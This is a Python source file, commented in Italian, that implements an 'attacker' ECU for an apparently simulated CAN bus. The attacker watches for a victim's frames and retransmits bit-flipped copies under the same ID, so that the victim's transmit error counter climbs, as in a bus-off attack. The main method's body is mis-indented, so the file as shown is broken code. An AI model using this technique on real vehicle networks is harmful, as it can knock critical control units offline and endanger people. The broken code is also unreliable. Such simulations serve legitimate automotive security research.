from ecu_base import ECU, Role, NodeState, ErrorFlagType, ERROR_FLAG_ID
import can
import time

# --- Funzioni per Bit Flipping --- #

def flip_first_one_from_left(byte_val: int) -> int:
    """
    Cerca il primo bit a 1 da sinistra (bit 7 → 0) e lo mette a 0.
    Se il byte è 0x00, lo lascia invariato.
    """
    for bit in range(7, -1, -1):
        if byte_val & (1 << bit):
            return byte_val & ~(1 << bit)
    return byte_val


# --- Classe Attacker --- #

class AttackerECU(ECU):
    def __init__(self, victim_id: int, *args, **kwargs):
        # L'Attaccante non trasmette ciclicamente, quindi nel main gli passerai period_sec=0.0
        super().__init__(*args, **kwargs)
        self.victim_id = victim_id

    # L'Attaccante non trasmette periodicamente
    def _tx_loop(self):
        while not self._stop:
            time.sleep(0.1)

    def _handle_normal_frame(self, msg: can.Message):
    """
    L'Attaccante sniffa il bus e risponde solo al frame della Vittima.
    Tutta la logica usa SOLO _rx_loop (niente recv qui dentro).
    """
    # Se non è un frame della vittima → lo ignoro
    if msg.arbitration_id != self.victim_id:
        return

    # Se sto già trasmettendo (magari un attacco precedente) → non reentrante
    if self.currently_transmitting:
        return

    # Costruisco il payload corrotto (bit-flip sul primo byte)
    modified_data = bytearray(msg.data)
    if len(modified_data) > 0:
        modified_data[0] = flip_first_one_from_left(modified_data[0])

    att_msg = can.Message(
        arbitration_id=self.victim_id,   # stesso ID per garantire bit error
        data=modified_data,
        is_extended_id=msg.is_extended_id
    )

    try:
        self.currently_transmitting = True
        self.last_tx_data = bytes(modified_data)
        now = time.time()
        self.last_tx_time = now
        # Finestra in cui mi aspetto l'ERROR_FLAG della vittima
        self.tx_deadline = now + 0.02

        self.bus.send(att_msg)
        print(f"[{self.name}] ATTACK: TX_V={msg.data.hex().upper()} → TX_A={att_msg.data.hex().upper()}")

        # ⚠️ NIENTE recv() qui.
        # Se la vittima è ERROR_ACTIVE:
        #   - manderà ERROR_FLAG → _rx_loop (dell'attaccante) vedrà ERROR_FLAG mentre current_tx=True
        #   - → _on_tx_error() → TEC +8
        # Se la vittima è ERROR_PASSIVE:
        #   - non vedo ERROR_FLAG attivo → nessun errore qui
        #   - scaduta tx_deadline → _rx_loop chiamerà _on_tx_success() → TEC -1

    except can.CanError as e:
        print(f"[{self.name}] Errore invio frame attacco: {e}")
        self._on_tx_error()
        self.currently_transmitting = False
